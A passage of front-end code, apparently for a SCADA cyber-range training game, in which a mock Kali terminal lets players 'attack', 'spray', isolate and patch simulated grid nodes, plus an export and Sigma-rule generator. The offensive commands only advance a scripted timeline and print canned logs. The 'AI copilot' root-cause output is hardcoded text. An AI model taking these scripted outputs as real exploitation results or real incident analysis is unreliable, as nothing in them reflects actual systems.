      if (d.t > t && !choices[d.id]) {
        promptedRef.current.delete(d.id);
      }
    }

    // Decision catch-up check: Find any unprompted, unanswered decision at or before current time t
    const pendingDecision = DECISIONS.find(
      (d) => d.t <= t && !promptedRef.current.has(d.id) && !choices[d.id],
    );
    if (pendingDecision) {
      promptedRef.current.add(pendingDecision.id);
      setActiveDecision(pendingDecision);
      setPlaying(false);
    }
  }, [activeIdx, t, choices, DECISIONS]);

  // Core Simulation Graph Evaluation Engine (Air-Gap Reachability, MTTD/MTTR, Physics, Cascade Containment)
  const graphState = useMemo<SimulationGraphState>(() => {
    return evaluateSimulationState({
      t,
      nodes: NODES,
      edges: EDGES,
      events: EVENTS,
      decisions: DECISIONS,
      choices,
      isolatedNodes,
      patchedNodes,
      firstActionTime,
      sector,
      totalTime: TOTAL,
      controllerOverrides,
    });
  }, [
    t,
    choices,
    isolatedNodes,
    patchedNodes,
    firstActionTime,
    sector,
    NODES,
    EDGES,
    EVENTS,
    DECISIONS,
    TOTAL,
    controllerOverrides,
  ]);

  const compromisedNodes = graphState.compromisedNodes;
  const blockedNodes = graphState.blockedNodes;
  const activeEvents = graphState.activeEvents;
  const speedHz = graphState.physics.speedHz;
  const bearingC = graphState.physics.bearingC;
  const pressure = graphState.physics.pressure;

  // Real-time pre-flight Air-Gap blast radius calculation
  const blastRadiusResult = useMemo(() => {
    if (!previewAirGapNode) return null;
    return computeBlastRadius(
      NODES,
      EDGES,
      previewAirGapNode,
      compromisedNodes,
      isolatedNodes,
      (x, y) => ({ x: 70 + (x / 100) * 760, y: 55 + (y / 100) * 380 }),
      34,
    );
  }, [previewAirGapNode, NODES, EDGES, compromisedNodes, isolatedNodes]);

  const outcome = useMemo(
    () => ({
      mw: graphState.mwShed,
      impactLabel: graphState.impactLabel,
      impactFormatted: graphState.impactFormatted,
      duration: graphState.durationText,
      alarms: graphState.alarmsText,
      mttd: graphState.mttdFormatted,
      mttr: graphState.mttrFormatted,
      cost: graphState.costFormatted,
      branch: graphState.outcomeBranch,
      dossierId: graphState.dossierId,
      narrative: graphState.narrative,
      physicsMul: graphState.physicsMul,
    }),
    [graphState],
  );

  const halt = useMemo<{ node: string; reason: string } | null>(() => {
    if (activeIdx >= 0 && activeIdx < EVENTS.length) {
      const nextEv = EVENTS[activeIdx + 1];
      if (nextEv) {
        if (isolatedNodes.has(nextEv.node)) {
          return {
            node: nextEv.node,
            reason: "SEGMENT ISOLATED — no route to next stage",
          };
        }
        if (blockedNodes.has(nextEv.node)) {
          return {
            node: nextEv.node,
            reason: "AIR-GAP REACHED — every path to the next stage is severed",
          };
        }
      }
      const currEv = EVENTS[activeIdx];
      if (currEv && isolatedNodes.has(currEv.node)) {
        return {
          node: currEv.node,
          reason: "ASSET AIR-GAPPED — perimeter severed",
        };
      }
    }
    return null;
  }, [activeIdx, isolatedNodes, blockedNodes, EVENTS]);

  const liveMetrics = useMemo(() => {
    return {
      mttd: outcome.mttd,
      mttr: outcome.mttr,
      shed: `${outcome.mw} MW`,
      cost: outcome.cost,
    };
  }, [outcome]);

  // Sync / reset streamed index when scrubbing backwards
  useEffect(() => {
    if (activeIdx < streamedIdxRef.current) {
      streamedIdxRef.current = activeIdx;
    }
  }, [activeIdx]);

  // LIVE AUTOMATED ATTACK STREAMING: Log real-time Kali exploit commands as video/simulation plays
  useEffect(() => {
    if (activeIdx <= streamedIdxRef.current || activeIdx < 0) return;
    const fromIdx = streamedIdxRef.current + 1;
    streamedIdxRef.current = activeIdx;

    const newEntries: string[] = [];
    for (let i = fromIdx; i <= activeIdx; i++) {
      const ev = EVENTS[i];
      if (!ev) continue;

      const nodeObj = NODES.find((n) => n.id === ev.node);
      const nodeLabel = nodeObj?.label ?? ev.node.toUpperCase();
      const nodeIp = `10.0.${nodeObj?.ring ?? 1}.${10 + i * 4}`;
      const isIso = isolatedNodes.has(ev.node);
      const isPatched = patchedNodes.has(ev.node);
      const isBlocked = blockedNodes.has(ev.node);

      // Trigger node ripple animation in topology
      triggerNodeTarget(ev.node, "exploit");

      // 1. Kali offensive command line
      const cliCmd = getOffensiveKaliCommand(sector, ev, nodeIp, nodeLabel);
      newEntries.push(`┌──(kali㏌twinsec)-[~/cyber-range]\n└─$ ${cliCmd}`);

      // 2. Check if defense is active
      if (isIso) {
        newEntries.push(
          `[!] ATTACK BLOCKED: Target node '${ev.node}' (${nodeLabel}) is AIR-GAPPED.`,
          `[*] OT physical boundary link severed. Adversary payload dropped at perimeter firewall.`,
          `[*] Simulation propagation paused. Type 'restore ${ev.node}' or scrub timeline to resume.`,
        );
        setPlaying(false);
        setShareToast(`[AIR-GAP DEFENSE]: ${nodeLabel} PROTECTED · PROPAGATION HALTED`);
      } else if (isBlocked) {
        newEntries.push(
          `[!] ATTACK PREVENTED: Lateral path to '${nodeLabel}' is severed by upstream air-gap barrier.`,
          `[*] Cascade halted before reaching Purdue Level ${nodeObj?.ring ?? 1}.`,
        );
        setPlaying(false);
        setShareToast(`[BLOCKED UPSTREAM]: Cascade halted before ${nodeLabel}`);
      } else if (isPatched) {
        newEntries.push(
          `[!] EXPLOIT REJECTED: Target node '${nodeLabel}' has FIRMWARE ATTESTATION.`,
          `[*] Memory integrity verified. Exploit payload execution rejected (E_NOEXPLOIT).`,
        );
      } else {
        // Successful attack phase
        const upstream = EDGES.filter((e) => e.to === ev.node || e.from === ev.node)
          .map((e) => (e.to === ev.node ? e.from : e.to))
          .filter((id) => compromisedNodes.has(id));
        const srcLabel = upstream[0]
          ? (NODES.find((n) => n.id === upstream[0])?.label ?? upstream[0].toUpperCase())
          : "C2-EXTERNAL";

        newEntries.push(
          `[+] [T+${fmt(ev.t)}] link ${srcLabel} → ${nodeLabel} · session established (${ev.tag})`,
          `[+] ${ev.sev} ${nodeLabel} :: ${ev.title}`,
          `    ${ev.desc}`,
        );
      }
    }

    if (newEntries.length > 0) {
      setTerminalLogs((prev) => [...prev, ...newEntries].slice(-500));
    }
  }, [
    activeIdx,
    sector,
    isolatedNodes,
    patchedNodes,
    blockedNodes,
    compromisedNodes,
    triggerNodeTarget,
    EDGES,
    EVENTS,
    NODES,
  ]);

  const activeNode = selected ? (NODES.find((n) => n.id === selected) ?? null) : null;

  const activeNodeBlastRadius = useMemo(() => {
    if (!activeNode) return null;
    return computeBlastRadius(
      NODES,
      EDGES,
      activeNode.id,
      compromisedNodes,
      isolatedNodes,
      (x, y) => ({ x: 70 + (x / 100) * 760, y: 55 + (y / 100) * 380 }),
      34,
    );
  }, [activeNode, NODES, EDGES, compromisedNodes, isolatedNodes]);

  const restart = useCallback(() => {
    setT(0);
    lastIdxRef.current = -1;
    streamedIdxRef.current = -1;
    promptedRef.current = new Set();
    setChoices({});
    setInteractions([]);
    setActiveDecision(null);
    setIsolatedNodes(new Set());
    setPatchedNodes(new Set());
    setFirstActionTime(null);
    setPlaying(true);
    setTerminalLogs([
      "┌──(kali㏌twinsec)-[~/cyber-range]",
      `└─$ twinsec-cli --init --sector=${(sector || "power").toUpperCase()}`,
      `[*] ${exercise.title} SCADA Cyber Range Target Initialized.`,
      `[*] Target Site: ${exercise.site}`,
      `[*] Active Protocols: ${exercise.protocols}`,
      "[*] Simulation timeline rewound to T+00:00:00. Automated incident playback active.",
    ]);
    if (typeof window !== "undefined" && window.location.hash) {
      history.replaceState(null, "", window.location.pathname + window.location.search);
    }
  }, [sector, exercise]);

  const handleTerminalSubmit = (e?: React.FormEvent<HTMLFormElement>, overrideCmd?: string) => {
    if (e && e.preventDefault) e.preventDefault();
    const raw = (overrideCmd ?? terminalInput).trim();
    if (!raw) return;
    setTerminalInput("");
    playTerminalKeySound();

    applyTwinCommandFn({ data: { command: raw } }).catch(() => {});

    const parts = raw.toLowerCase().split(/\s+/);
    const cmd = parts[0];
    const targetArg = parts[1];
    const optArg = parts[2];
    const newLogs = [...terminalLogs, `┌──(kali㏌twinsec)-[~/cyber-range]\n└─$ ${raw}`];

    if (cmd === "clear") {
      setTerminalLogs([]);
      return;
    } else if (cmd === "help" || cmd === "guide" || cmd === "?") {
      newLogs.push(
        "[+] TWINSEC CLI COMMAND REFERENCE (CYBER RANGE ENGINE):",
        "    attack [node_id]     - Deploy exploit payload and compromise targeted SCADA node",
        "    scan [node_id]       - Query SCADA topology nodes, air-gap status & open ICS ports",
        "    step / next          - Advance attack timeline to next scenario event phase",
        "    reset / restart      - Rewind simulation clock to T+00:00:00 baseline",
        "    connect <node_id>    - Attempt lateral move / network traversal to target node",
        "    spray / c2-beacon    - Broadcast attack probe across all reachable subnet links",
        "    isolate <node_id>    - Quarantine / Air-gap PLC node from OT bus to sever cascade",
        "    reconnect <node_id>  - Reconnect isolated node back to OT industrial fieldbus",
        "    patch <node_id>      - Apply firmware cryptographic attestation patch",
        "    override <node> [p] [v] - Send manual setpoint override (e.g. 'override plc-3 60.0')",
        "    decide <d1|d2|d3> <act|defend> - Execute tactical operator decision",
        "    play / pause         - Start or halt real-time simulation clock",
        "    ai-explain / ai      - Invoke Explainable AI Copilot for root cause & MITRE ATT&CK",
        "    sigma / siem         - Compile live telemetry to production YAML Sigma SIEM rule",
        "    hai / replay         - Open HAI continuous telemetry replay & ground-truth ML lab",
        "    mitre / stix         - Open MITRE ATT&CK for ICS STIX 2.1 matrix & technique explorer",
        "    otcad / dossiers     - Open OTCAD historical cyberattack dossier repository",
        "    inject <sector>      - Switch threat campaign (power|water|oil-gas|manufacturing...)",
        "    export [json|csv|report] - Export run ledger data debrief dossier",
        "    status               - Query live physics telemetry (Hz, °C, bar), MTTD, MTTR & cost",
        "    blast [node_id]      - Pre-flight evaluate air-gap blast radius & telemetry loss",
        "    clear                - Clear terminal console",
      );
    } else if (translateSectorCommand(cmd, targetArg, sector, NODES)) {
      const translation = translateSectorCommand(cmd, targetArg, sector, NODES)!;
      newLogs.push(...translation.outputLogs);
      if (translation.action === "isolate") {
        setIsolatedNodes((prev) => new Set([...Array.from(prev), translation.targetNodeId]));
        triggerNodeTarget(translation.targetNodeId, "isolate");
        playAirGapRelaySound();
        if (firstActionTime === null) setFirstActionTime(t > 0 ? t : 750);
        setShareToast(`[AIR-GAP ISOLATED]: ${translation.targetNodeLabel}`);
      } else if (translation.action === "reconnect") {
        setIsolatedNodes((prev) => {
          const next = new Set(prev);
          next.delete(translation.targetNodeId);
          return next;
        });
        setShareToast(`[RECONNECTED]: ${translation.targetNodeLabel}`);
      } else if (translation.action === "override") {
        triggerNodeTarget(translation.targetNodeId, "override");
        setShareToast(`[OVERRIDE SETPOINT]: ${translation.targetNodeLabel}`);
      }
    } else if (cmd === "reset" || cmd === "restart" || cmd === "rewind") {
      restart();
      newLogs.push("[+] SIMULATION CLOCK REWOUND TO T+00:00:00. Baseline nominal state restored.");
      setShareToast("[RESET]: TIMELINE REWOUND TO T+00:00:00");
    } else if (cmd === "spray" || cmd === "c2-beacon" || cmd === "c2") {
      newLogs.push(
        `[*] BROADCASTING C2 PAYLOAD SPRAY ACROSS ${exercise.protocols.toUpperCase()}...`,
      );
      // Trigger animations across active uncompromised nodes
      const uncompNodes = NODES.filter(
        (n) => !compromisedNodes.has(n.id) && !isolatedNodes.has(n.id),
      );
      if (uncompNodes.length > 0) {
        const nextTarget = uncompNodes[0];
        triggerNodeTarget(nextTarget.id, "attack");
        const ev = EVENTS.find((e) => e.node === nextTarget.id);
        if (ev) setT(ev.t);
        newLogs.push(
          `[+] C2 SPRAY PENETRATED: Target ${nextTarget.id} (${nextTarget.label}) BREACHED.`,
          `[*] Cascade expanding across OT Ring ${nextTarget.ring}.`,
        );
      } else {
        newLogs.push("[*] ALL TARGET NODES ALREADY COMPROMISED OR AIR-GAPPED.");
      }
    } else if (cmd === "attack" || cmd === "exploit" || cmd === "hack" || cmd === "connect") {
      let targetNode: Node | undefined;
      if (targetArg) {
        targetNode =
          resolveSectorNode(targetArg, sector, NODES) ||
          NODES.find(
            (n) => n.id.toLowerCase() === targetArg || n.label.toLowerCase().includes(targetArg),
          );
      } else {
        targetNode =
          NODES.find((n) => !compromisedNodes.has(n.id) && !isolatedNodes.has(n.id)) || NODES[0];
      }

      if (targetNode) {
        triggerNodeTarget(targetNode.id, "exploit");
        if (isolatedNodes.has(targetNode.id)) {
          setPlaying(false);
          newLogs.push(
            `[!] ATTACK VECTOR SEVERED: Target node '${targetNode.id}' (${targetNode.label}) is AIR-GAPPED.`,
            `[*] Physical link offline. Adversary payload dropped at perimeter.`,
          );
          setShareToast(`[AIR-GAP BLOCKED]: ${targetNode.label} is unreachable`);
        } else {
          const ev = EVENTS.find((e) => e.node === targetNode.id);
          if (ev) {
            setT(ev.t);
            playBreakerTripAlert();
            newLogs.push(
              `[+] EXPLOIT DEPLOYED: ${targetNode.id.toUpperCase()} (${targetNode.label}) [T+${fmt(ev.t)}]`,
              `    Attack Phase: ${ev.tag} · ${ev.title}`,
              `    Consequence: ${ev.desc}`,
            );
          } else {
            setT((prev) => Math.min(TOTAL, prev + 800));
            playBreakerTripAlert();
            newLogs.push(
              `[+] SUCCESS: Connection established to ${targetNode.id} (${targetNode.label}).`,
              `[*] Protocol: ${exercise.protocols} · Exploitation payload active.`,
            );
          }
          if (firstActionTime === null) setFirstActionTime(t > 0 ? t : 750);
          setShareToast(`[EXPLOIT]: ${targetNode.label} BREACHED`);
        }
      } else {
        newLogs.push(`[!] ERROR: Unknown target node '${targetArg}'. Type 'scan' for node list.`);
      }
    } else if (cmd === "export" || cmd === "report" || cmd === "ledger") {
      const exportFmt = targetArg || "json";
      const ledgerData: RunLedgerData = {
        runId: `RUN-${sector.toUpperCase()}-${Math.floor(1000 + Math.random() * 9000)}`,
        timestamp: new Date().toISOString(),
        sector,
        adversary: exercise.adversary,
        role: "BLUE",
        choices,
        decisions: DECISIONS,
        terminalCommands: terminalLogs,
        isolatedNodes: Array.from(isolatedNodes),
        patchedNodes: Array.from(patchedNodes),
        metrics: {
          mwShed: graphState.mwShed,
          mttdFormatted: graphState.mttdFormatted,
          mttrFormatted: graphState.mttrFormatted,
          costFormatted: graphState.costFormatted,
          score: Math.max(
            0,
            Math.round(
              100 -
                (graphState.mwShed / 14) * 50 -
                (graphState.totalCompromised / NODES.length) * 30,
            ),
          ),
          outcomeBranch: graphState.outcomeBranch,
          impactLabel: graphState.impactLabel,
          impactFormatted: graphState.impactFormatted,
          physics: graphState.physics,
        },
        activeEvents: graphState.activeEvents,
      };

      if (!operator?.loggedIn) {
        newLogs.push(
          "[-] ACCESS DENIED: File and data export is restricted to authenticated operators.",
        );
        newLogs.push(
          "[!] ACTION: Authenticate your operator dossier to unlock CSV, JSON, and report downloads.",
        );
        setAuthGateOpen(true);
      } else if (exportFmt === "csv") {
        exportRunLedgerCSV(ledgerData);
        newLogs.push("[+] SUCCESS: Exported run ledger data in CSV format.");
      } else if (exportFmt === "report" || exportFmt === "html" || exportFmt === "dossier") {
        exportRunLedgerReport(ledgerData);
        newLogs.push("[+] SUCCESS: Exported run debrief dossier report in HTML format.");
      } else {
        exportRunLedgerJSON(ledgerData);
        newLogs.push("[+] SUCCESS: Exported run ledger data in JSON format.");
      }
    } else if (cmd === "scan" || cmd === "init" || cmd === "nmap" || cmd === "probe") {
      newLogs.push("[*] SCANNING SCADA ICS TOPOLOGY NODES...");
      if (targetArg) {
        const targetNode =
          resolveSectorNode(targetArg, sector, NODES) ||
          NODES.find(
            (n) => n.id.toLowerCase() === targetArg || n.label.toLowerCase().includes(targetArg),
          );
        if (targetNode) triggerNodeTarget(targetNode.id, "scan");
      } else {
        triggerNodeTarget(NODES[0].id, "scan");
      }
      NODES.forEach((n) => {
        const isComp = compromisedNodes.has(n.id);
        const isIso = isolatedNodes.has(n.id);
        const isBlock = blockedNodes.has(n.id);
        const isPatched = patchedNodes.has(n.id);
        const statusStr = isIso
          ? "[AIR-GAPPED]"
          : isComp
            ? "[BREACHED]"
            : isBlock
              ? "[SHIELDED]"
              : isPatched
                ? "[PATCHED]"
                : "[NOMINAL]";
        newLogs.push(
          `  - ${n.id.padEnd(8, " ")} (${n.label.padEnd(10, " ")}): ${statusStr} · Ring ${n.ring} · ${n.kind.toUpperCase()}`,
        );
      });
    } else if (cmd === "step" || cmd === "next") {
      const nextEv = EVENTS.find((ev) => ev.t > t);
      if (nextEv) {
        triggerNodeTarget(nextEv.node, "exploit");
        if (isolatedNodes.has(nextEv.node)) {
          setPlaying(false);
          newLogs.push(
            `[!] ATTACK VECTOR SEVERED: Target node '${nextEv.node}' (${nextEv.tag}) is AIR-GAPPED.`,
            `[*] Downstream lateral move blocked at T+${fmt(nextEv.t)}.`,
          );
          setShareToast(`[AIR-GAP BLOCKED]: Node ${nextEv.node.toUpperCase()} is protected.`);
        } else {
          setT(nextEv.t);
          newLogs.push(
            `[+] ADVANCED TO T+${fmt(nextEv.t)} · ${nextEv.tag} on ${nextEv.node.toUpperCase()}`,
            `    ${nextEv.title}: ${nextEv.desc}`,
          );
        }
      } else {
        newLogs.push(`[*] SIMULATION TIMELINE COMPLETE at T+${fmt(t)}.`);
      }
    } else if (cmd === "blast" || cmd === "blast-radius" || cmd === "radius") {
      const targetNode = targetArg
        ? resolveSectorNode(targetArg, sector, NODES) ||
          NODES.find(
            (n) =>
              n.id.toLowerCase() === targetArg ||
              n.label.toLowerCase() === targetArg ||
              n.label.toLowerCase().includes(targetArg),
          )
        : NODES.find(
            (n) =>
              n.id === "switch-a" ||
              n.id === "nocgw" ||
              n.kind.toLowerCase().includes("switch") ||
              n.kind.toLowerCase().includes("gateway") ||
              n.ring === 2,
          ) || NODES[0];

      if (!targetNode) {
        newLogs.push(
          `[!] ERROR: Target node '${targetArg || ""}' not found in ${sector.toUpperCase()} sector.`,
          `[*] Available bridges & controllers: ${NODES.filter((n) => n.ring <= 3)
            .map((n) => n.label)
            .join(", ")}`,
          `[*] Usage: blast <node_id> (e.g. 'blast SW-A', 'blast ${NODES[3]?.label || "PLC-3"}')`,
        );
      } else {
        const result = computeBlastRadius(
          NODES,
          EDGES,
          targetNode.id,
          compromisedNodes,
          isolatedNodes,
          (x, y) => ({ x: 70 + (x / 100) * 760, y: 55 + (y / 100) * 380 }),
          34,
        );

        setPreviewAirGapNode(targetNode.id);
        playTerminalKeySound();

        const blindedNames = result.blindedNodeIds
          .map((id) => NODES.find((n) => n.id === id)?.label || id)
          .join(", ");
        const protectedNames = result.protectedNodeIds
          .map((id) => NODES.find((n) => n.id === id)?.label || id)
          .join(", ");

        newLogs.push(
          `[+] PRE-FLIGHT AIR-GAP BLAST EVALUATION: ${targetNode.label} (${targetNode.id.toUpperCase()})`,
          `----------------------------------------------------------------------`,
          `    Blinded Telemetry Partition: ${result.metrics.blindedCount} assets (${result.metrics.blindnessPercentage}%)`,
          `    Affected Nodes:             [ ${blindedNames || "NONE"} ]`,
          `    Infection Severance Delta:   +${result.metrics.containmentScoreDelta}% Containment`,
          `    Protected Clean Enclave:    [ ${protectedNames || "NONE"} ]`,
          `    Critical Safety Barrier:    ${result.metrics.safetySystemsIntact ? "[PRESERVED - SIS NOMINAL]" : "[WARNING - SAFETY EXPOSED]"}`,
          `    Severed Topology Links:     ${result.severedEdgeKeys.length} physical trunks`,
          `----------------------------------------------------------------------`,
          `[*] ACTION: Type 'isolate ${targetNode.label}' or click [AIR-GAP ISOLATE] in HUD.`,
        );
        setShareToast(`[BLAST RADIUS]: ${targetNode.label} EVALUATED`);
      }
    } else if (cmd === "isolate" || cmd === "airgap" || cmd === "quarantine") {
      if (!targetArg) {
        newLogs.push(
          "[!] ERROR: Please specify a target node ID (e.g. 'isolate plc-3' or 'isolate SW-A').",
        );
      } else {
        const targetNode =
          resolveSectorNode(targetArg, sector, NODES) ||
          NODES.find(
            (n) => n.id.toLowerCase() === targetArg || n.label.toLowerCase().includes(targetArg),
          );
        if (targetNode) {
          triggerNodeTarget(targetNode.id, "isolate");
          setIsolatedNodes((prev) => new Set([...Array.from(prev), targetNode.id]));
          if (previewAirGapNode === targetNode.id) {
            setPreviewAirGapNode(null);
          }
          applyTwinCommandFn({ data: { command: `isolate ${targetNode.id}` } }).catch(() => {});
          playAirGapRelaySound();
          if (firstActionTime === null) setFirstActionTime(t > 0 ? t : 750);
          newLogs.push(
            `[+] SUCCESS: Node ${targetNode.id.toUpperCase()} (${targetNode.label}) AIR-GAPPED & QUARANTINED.`,
            `[*] OT routing table updated. Physical air-gap barrier active.`,
            `[*] Lateral adversary propagation vector severed across network bridge.`,
          );
          setShareToast(`[AIR-GAP]: ${targetNode.label} ISOLATED`);
        } else {
          newLogs.push(`[!] ERROR: Unknown node '${targetArg}'. Type 'scan' to list nodes.`);
        }
      }
    } else if (cmd === "block-ip" || cmd === "block" || cmd === "firewall") {
      if (!targetArg) {
        newLogs.push("[!] ERROR: Please specify IP or node to block (e.g. 'block-ip 10.0.0.45').");
      } else {
        if (firstActionTime === null) setFirstActionTime(t > 0 ? t : 750);
        newLogs.push(
          `[+] SUCCESS: Firewalled and revoked access for host/IP ${targetArg.toUpperCase()}.`,
          `[*] Threat actor C2 tunnel blackholed at network edge gateway.`,
        );
        setShareToast(`[FIREWALL]: REVOKED ACCESS FOR ${targetArg.toUpperCase()}`);
      }
    } else if (cmd === "restore-logic" || cmd === "restore") {
      if (!targetArg) {
        newLogs.push("[!] ERROR: Specify node ID to restore logic (e.g. 'restore plc-3').");
      } else {
        const targetNode = NODES.find(
          (n) => n.id.toLowerCase() === targetArg || n.label.toLowerCase().includes(targetArg),
        );
        if (targetNode) {
          triggerNodeTarget(targetNode.id, "patch");
          setPatchedNodes((prev) => new Set([...Array.from(prev), targetNode.id]));
          applyTwinCommandFn({ data: { command: `reset ${targetNode.id}` } }).catch(() => {});
          applyTwinCommandFn({ data: { command: `patch ${targetNode.id}` } }).catch(() => {});
          if (firstActionTime === null) setFirstActionTime(t > 0 ? t : 750);
          newLogs.push(
            `[+] SUCCESS: Golden firmware baseline restored on ${targetNode.id}.`,
            `[*] Telemetry setpoints restored to nominal operating envelope. TwinRuntime reset.`,
          );
          setShareToast(`[BASELINE RESTORED]: ${targetNode.label}`);
        } else {
          newLogs.push(`[!] ERROR: Unknown node '${targetArg}'.`);
        }
      }
    } else if (
      cmd === "modbus-cli" ||
      cmd === "modbus-write" ||
      cmd === "iec104-inject" ||
      cmd === "usb-inject" ||
      cmd === "s7-rootkit"
    ) {
      const nextEv = EVENTS.find((ev) => ev.t > t);
      if (nextEv) {
        triggerNodeTarget(nextEv.node, "exploit");
        setT(nextEv.t);
        newLogs.push(
          `[+] OFFENSIVE COMMAND EXECUTED: ${raw}`,
          `[*] Attack phase advanced to T+${fmt(nextEv.t)} · ${nextEv.tag} on ${nextEv.node.toUpperCase()}`,
          `[*] Payload result: ${nextEv.title}`,
        );
      } else {
        newLogs.push(`[*] OFFENSIVE PAYLOAD DEPLOYED: ${raw}. Target network fully compromised.`);
      }
    } else if (cmd === "reconnect" || cmd === "unisolate") {
      if (!targetArg) {
        newLogs.push("[!] ERROR: Specify node ID to reconnect (e.g. 'reconnect plc-3').");
      } else {
        const targetNode = NODES.find(
          (n) => n.id.toLowerCase() === targetArg || n.label.toLowerCase().includes(targetArg),
        );
        if (targetNode) {
          triggerNodeTarget(targetNode.id, "scan");
          setIsolatedNodes((prev) => {
            const next = new Set(prev);
            next.delete(targetNode.id);
            return next;
          });
          applyTwinCommandFn({ data: { command: `reconnect ${targetNode.id}` } }).catch(() => {});
          newLogs.push(
            `[+] SUCCESS: Node ${targetNode.id} (${targetNode.label}) RECONNECTED to OT bus.`,
          );
        } else {
          newLogs.push(`[!] ERROR: Unknown node '${targetArg}'.`);
        }
      }
    } else if (cmd === "override") {
      if (!targetArg) {
        newLogs.push(
          "[!] ERROR: Usage: override <node_id> [parameter] [value] (e.g. 'override plc-3 frequency 50.0').",
        );
      } else {
        const targetNode =
          resolveSectorNode(targetArg, sector, NODES) ||
          NODES.find(
            (n) => n.id.toLowerCase() === targetArg || n.label.toLowerCase().includes(targetArg),
          );
        if (targetNode) {
          triggerNodeTarget(targetNode.id, "override");
          if (firstActionTime === null) setFirstActionTime(t > 0 ? t : 750);
          const paramName = optArg ? optArg.toLowerCase() : "frequency";
          const valNum = parts[3] ? parseFloat(parts[3]) : null;
          const targetVal = valNum !== null && !isNaN(valNum) ? valNum : 50.0;

          // Dispatch setpoint override to authoritative TwinRuntime engine
          applyTwinCommandFn({
            data: { command: `override ${targetNode.id} ${paramName} ${targetVal}` },
          }).catch(() => {});

          // Lock controller setpoint in simulation state (does NOT alter UI playback speed!)
          setControllerOverrides((prev) => ({
            ...prev,
            [targetNode.id]: { param: paramName, value: targetVal },
          }));

          newLogs.push(
            `[+] SUCCESS: Manual setpoint override issued to ${targetNode.id} (${targetNode.label}).`,
            `[*] Controller register '${paramName}' locked to ${targetVal}. Ground-truth telemetry updated.`,
          );
          setShareToast(`[OVERRIDE]: APPLIED TO ${targetNode.label}`);
        } else {
          newLogs.push(`[!] ERROR: Unknown node '${targetArg}'. Type 'scan' to list nodes.`);
        }
      }
    } else if (cmd === "ai-explain" || cmd === "ai" || cmd === "copilot") {
      setIntelTab("anatomy");
      newLogs.push(
        "[+] INITIATING EXPLAINABLE AI COPILOT ANALYSIS...",
        "[*] Cascading query across Multi-Provider AI Gateway...",
        `[+] ROOT-CAUSE DIAGNOSIS (${sector.toUpperCase()} SECTOR):`,
        `    - Purdue Level Breached: Level 1 (PLC/RTU) & Level 3 (SCADA Gateway)`,
        `    - MITRE ATT&CK for ICS: T0855 (Unauthorized Command Message), T0831 (Manipulation of Control)`,
        `    - Attack Vector: ${exercise.adversary} exploited unauthenticated SCADA protocol channels (${exercise.protocols}).`,
        `    - Physical Consequence: System telemetry drift detected on ${taskTarget1.label}.`,
        `    - Recommended Remediation: Run 'isolate ${taskTarget1.id}' to air-gap PLC and 'patch ${taskTarget1.id}' for attestation.`,
      );
      setShareToast("[AI COPILOT]: ANALYSIS COMPLETE");
    } else if (cmd === "sigma" || cmd === "siem") {
      setShowSigmaModal(true);
      newLogs.push(
        "[+] GENERATING SIEM SIGMA DETECTION RULE (YAML)...",
        "---",
        `title: OT SCADA ${exercise.title} Detection`,
        `id: twinsec-sigma-${sector}-${Date.now().toString(36)}`,
        "status: production",
        `description: Detects unauthorized protocol commands targeting ${exercise.adversary} attack vector`,
        "references:",
        "  - MITRE ATT&CK for ICS: T0855 / T0831",
        "logsource:",
        "  category: network_traffic",
        "  product: industrial_control_system",
        "detection:",
        "  selection:",
        `    DestinationPort: ${exercise.protocols.includes("Modbus") ? 502 : 2404}`,
        `    Protocol: "${exercise.protocols}"`,
        '    PurdueLevel: "Level 1 (PLC)"',
        "  condition: selection",
        "falsepositives:",
        "  - Authorized scheduled engineering maintenance",
        "level: high",
      );
      setShareToast("[SIGMA]: SIEM DETECTION RULE EXPORTED");
    } else if (cmd === "hai" || cmd === "replay") {
      setIntelTab("hai");
      newLogs.push(
        "[+] ACTIVATING HAI CONTINUOUS ICS TELEMETRY REPLAY & ML EVALUATION...",
        "[*] Streaming 1.0s ground-truth telemetry with empirical z-score & physical residual detection.",
      );
      setShareToast("[HAI]: CONTINUOUS REPLAY ACTIVE");
    } else if (cmd === "mitre" || cmd === "stix" || cmd === "ttp") {
      setIntelTab("mitre");
      newLogs.push(
        "[+] OPENING MITRE ATT&CK FOR ICS STIX 2.1 MATRIX...",
        "[*] Indexed 118 real ICS techniques across 12 tactics with active mitigations.",
      );
      setShareToast("[MITRE]: ICS MATRIX OPENED");
    } else if (cmd === "otcad" || cmd === "dossier" || cmd === "history") {
      setIntelTab("otcad");
      newLogs.push(
        "[+] LOADING OTCAD HISTORICAL CYBERATTACK INCIDENT DOSSIERS...",
        "[*] 127 verified real-world ICS attacks available for cross-sector intelligence.",
      );
      setShareToast("[OTCAD]: HISTORIC DOSSIERS LOADED");
    } else if (cmd === "inject" || cmd === "scenario") {
      const secArg = targetArg ? targetArg.toLowerCase() : "";
      const validSectors = [
        "power",
        "water",
        "oil-gas",
        "manufacturing",
        "port",
        "smart-building",
        "smart-city",
      ];
      if (validSectors.includes(secArg)) {
        if (typeof window !== "undefined") {
          window.location.search = `?sector=${secArg}`;
        }
        newLogs.push(
          `[+] THREAT CAMPAIGN INJECTED: Active sector switched to '${secArg.toUpperCase()}'.`,
          `[*] Initializing Digital Twin network topology and kinetic physics engines...`,
        );
        setShareToast(`[INJECT]: Switched to ${secArg.toUpperCase()} sector`);
      } else {
        newLogs.push(
          "[!] ERROR: Usage: inject <power|water|oil-gas|manufacturing|port|smart-building|smart-city>",
          "    Available Sectors: power, water, oil-gas, manufacturing, port, smart-building, smart-city",
        );
      }
    } else if (cmd === "patch" || cmd === "attest") {
      if (!targetArg) {
        newLogs.push("[!] ERROR: Specify target node ID to patch (e.g. 'patch plc-3').");
      } else {
        const targetNode =
          resolveSectorNode(targetArg, sector, NODES) ||
          NODES.find(
            (n) => n.id.toLowerCase() === targetArg || n.label.toLowerCase().includes(targetArg),
          );
        if (targetNode) {
          triggerNodeTarget(targetNode.id, "patch");
          setPatchedNodes((prev) => new Set([...Array.from(prev), targetNode.id]));
          if (firstActionTime === null) setFirstActionTime(t > 0 ? t : 750);
          newLogs.push(
            `[+] SUCCESS: Firmware cryptographic attestation patch deployed to ${targetNode.id}.`,
            `[*] Ladder logic integrity verified. Adversarial execution vectors blocked.`,
          );
          setShareToast(`[PATCHED]: ${targetNode.label} SECURED`);
        } else {
          newLogs.push(`[!] ERROR: Unknown node '${targetArg}'.`);
        }
      }
    } else if (cmd === "play" || cmd === "start" || cmd === "run" || cmd === "resume") {
      setPlaying(true);
      newLogs.push("[+] SIMULATION CLOCK STARTED. Real-time physics telemetry active.");
    } else if (cmd === "pause" || cmd === "stop" || cmd === "halt") {
      setPlaying(false);
